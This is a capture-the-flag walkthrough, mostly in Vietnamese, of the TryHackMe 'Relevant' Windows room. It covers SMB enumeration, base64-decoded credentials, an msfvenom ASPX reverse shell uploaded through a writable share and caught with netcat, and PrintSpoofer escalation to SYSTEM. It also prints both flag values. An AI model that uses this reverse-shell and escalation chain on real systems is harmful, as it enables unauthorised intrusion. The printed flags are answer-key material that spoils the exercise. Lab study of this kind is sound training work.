# TryHackMe-Relevant

You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

User.txt
Root.txt
Additionally, the client has provided the following scope allowances:

Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
Locate and note all vulnerabilities found
Submit the flags discovered to the dashboard
Only the IP address assigned to your machine is in scope
Find and report ALL vulnerabilities (yes, there is more than one path to root)
(Roleplay off)

I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.
Note - Nothing in this room requires Metasploit

Machine may take up to 5 minutes for all services to start.

**Writeups will not be accepted for this room.**

recon 

rustscan -a 10.201.108.162 -- -sV -sC

<img width="572" height="394" alt="image" src="https://github.com/user-attachments/assets/ccb84ae2-f93f-4c22-909f-a43af3297d0c" />

Enumeration

<img width="810" height="412" alt="image" src="https://github.com/user-attachments/assets/cac1e72b-43ca-4a70-9f04-914b6038ad03" />

sau đó tôi sử dụng lệnh more passwords.txt thì phát hiện hàm băm base64

Qm9iIC0gIVBAJCRXMHJEITEyMw== 

QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk

tôi sử dụng cyberchef

output : 

Bob - !P@$$W0rD!123

Bill - Juw4nnaM4n420696969!$$$

hiện tại nó chưa giúp cho tôi đăng nhập được gì cả 

nhưng tôi phát hiện ra ta có thể đưa bất kì file nào vào smb thì sẽ được hiện trên http://10.201.108.162:49663/nt4wrksv/

tôi sẽ tiến hành tạo reverse shell trên máy của tôi

msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.14.108.226 LPORT=1234 -f aspx -o shell.aspx

sau đó trong smb của máy nạn nhân tôi put lên

ở máy của tôi tôi khởi chạy trình lắng nghe nc trên port 1234

sau đó nhập url http://10.201.108.162:49663/nt4wrksv/shell.aspx 

<img width="587" height="225" alt="image" src="https://github.com/user-attachments/assets/f72bc6ba-fa23-4a67-938d-ea670c7b4823" />

và tôi đã có được shell

<img width="736" height="338" alt="image" src="https://github.com/user-attachments/assets/4bba456b-288d-4eb4-b98f-d840b35c5976" />

Cờ đầu tiên nằm ở đường dẫn này 

PS C:\Users\Bob\Desktop> cat user.txt

THM{fdk4ka34vk346ksxfr21tg789ktf45}


Khai thác lỗ hổng PrintSpoofer

PrintSpoofer là một lỗ hổng có thể được sử dụng để nâng cao quyền của người dùng dịch vụ trên Windows Server 2016, Server 2019 và Windows 10.

Để nâng cao quyền tôi tham khảo bài viết này https://github.com/itm4n/PrintSpoofer

trên máy tấn công 

git clone https://github.com/dievus/printspoofer

sau đó put file lên smb 

<img width="737" height="290" alt="image" src="https://github.com/user-attachments/assets/64396042-baa5-425b-9650-4a0ecc4713ee" />

PrintSpoofer.exe -i -c cmd

<img width="644" height="440" alt="image" src="https://github.com/user-attachments/assets/aeee2921-5b89-41b7-b373-6c804b19b433" />

và tôi đã có được quyền system

<img width="844" height="773" alt="image" src="https://github.com/user-attachments/assets/8cb09655-c492-4716-9844-a650272ed0b1" />

cờ cuối cùng : THM{1fk5kf469devly1gl320zafgl345pv}
